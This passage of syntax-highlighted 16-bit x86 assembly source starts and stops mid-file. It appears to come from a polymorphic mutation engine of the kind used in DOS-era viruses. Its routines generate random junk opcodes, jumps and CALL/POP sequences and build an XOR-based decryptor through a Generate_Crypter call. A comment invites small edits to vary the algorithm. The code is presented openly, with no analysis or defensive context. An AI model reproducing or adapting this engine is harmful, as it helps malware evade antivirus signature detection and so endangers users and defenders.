&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jmp</span> &nbsp; &nbsp; short aa0<br />
<br />
nop16x<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; Random_Number<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">and</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">6</span><br />
<br />
aa0<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xchg</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">si</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; Random_Number<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jmp</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: #46aa03; font-weight: bold;">ds</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">si</span><span style="color: #339933;">+</span>NOPSets<span style="color: black;">&#93;</span><br />
<br />
<span style="color: black; font-style: italic;">;--- Check for, and insert random NOP ---------------------</span><br />
<br />
NOP_Size<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; Random_Number<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">test</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">3</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;does al have flag 0011?</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jz</span>&nbsp; &nbsp; &nbsp; short Byte_NOP<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">test</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">2</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;does al have flag 0010?</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jz</span>&nbsp; &nbsp; &nbsp; short Word_NOP<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">test</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">1</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;does al have flag 0001?</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jz</span>&nbsp; &nbsp; &nbsp; short nop16x<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;al flag must be 0000</span><br />
<br />
<span style="color: black; font-style: italic;">;--- NOP and junk routines --------------------------------</span><br />
<br />
Cond_JMP<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">and</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0Fh</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;J* 0000 (conditional)</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">or</span>&nbsp; &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">70h</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">stosw</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br />
<br />
JMP_Over<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0EBh</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;JMP xxxx / junk</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">and</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span><span style="color: #ff0000;">7</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">inc</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">stosw</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xchg</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">al</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;get lenght of bullshit</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cbw</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jmp</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Prep_Trash<br />
<br />
JMP_Up<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; Byte_NOP<br />
<br />
<span style="color: black; font-style: italic;">;Sample alteration: Use one or the other from the following 2 lines.</span><br />
<span style="color: black; font-style: italic;">; Making a few alterations like these changes the algorythm</span><br />
<br />
<span style="color: black; font-style: italic;">; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; ax,0EBh &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;JMP $+1 ..or..</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0fde2h</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;LOOP backwards</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">stosw</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br />
<br />
Byte_NOP<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bx</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;8-bit NOP</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">and</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0Fh</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;total NOPS available</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bx</span><span style="color: #339933;">,</span>junk_1byte<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; xlat<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">stosb</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br />
<br />
Word_NOP<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bx</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;16-bit NOP</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">and</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">303h</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bx</span><span style="color: #339933;">,</span>junk_2byte<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; xlat<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ah</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">stosb</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; Random_Number<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">and</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">7</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bl</span><span style="color: #339933;">,</span><span style="color: #ff0000;">9</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mul</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bl</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0C0h</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">stosb</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br />
<br />
CALL_NOPs<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;CALL xxxx / junk / POP reg</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0E8h</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">and</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0Fh</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">inc</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">stosw</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">sub</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">al</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">stosb</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xchg</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">al</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; Prep_Trash<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; NOP_Size<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; Random_Number &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;insert POP reg</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">and</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">7</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; no_sp<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">or</span>&nbsp; &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">58h</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">stosb</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">test</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ch</span><span style="color: #339933;">,</span><span style="color: #ff0000;">3</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;more?</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jnz</span> &nbsp; &nbsp; short CALL_NOPs_ret<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; NOP_Size<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0F087h</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;insert XCHG SI,reg</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">or</span>&nbsp; &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">cl</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">test</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ch</span><span style="color: #339933;">,</span><span style="color: #ff0000;">8</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jz</span>&nbsp; &nbsp; &nbsp; short j6_1<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">8Bh</span><br />
<br />
j6_1<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">stosw</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; NOP_Size<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; Random_Number<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xchg</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">bx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">and</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0F7FBh</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;insert XOR [SI],xxxx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">or</span>&nbsp; &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bl</span><span style="color: #339933;">,</span><span style="color: #ff0000;">8</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; Generate_Crypter<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bx</span><br />
<br />
CALL_NOPs_ret<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br />
<br />
Move_Something<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">and</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0Fh</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;MOV reg,xxxx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">or</span>&nbsp; &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0B0h</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; no_sp<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">stosb</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">test</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">8</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pushf</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; Random_Number<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">popf</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jmp</span> &nbsp; &nbsp; short Is_B_or_W<br />
<br />
<span style="color: #adadad; font-style: italic;">abcd</span><span style="color: #ff0000;">1</span><span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">and</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span><span style="color: #ff0000;">39h</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;DO r/m,r(8/16)</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">or</span>&nbsp; &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0C0h</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; no_sp<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xchg</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">al</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">stosw</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br />
<br />
<span style="color: #adadad; font-style: italic;">abcd</span><span style="color: #ff0000;">2</span><span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">and</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">3Bh</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;DO r(8/16),r/m</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">or</span>&nbsp; &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">2</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">and</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span><span style="color: #ff0000;">3Fh</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; no_sp2<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; no_bp<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">stosw</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br />
<br />
CMPS_SCAS<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">and</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">9</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;CMPS* or SCAS*</span><br />
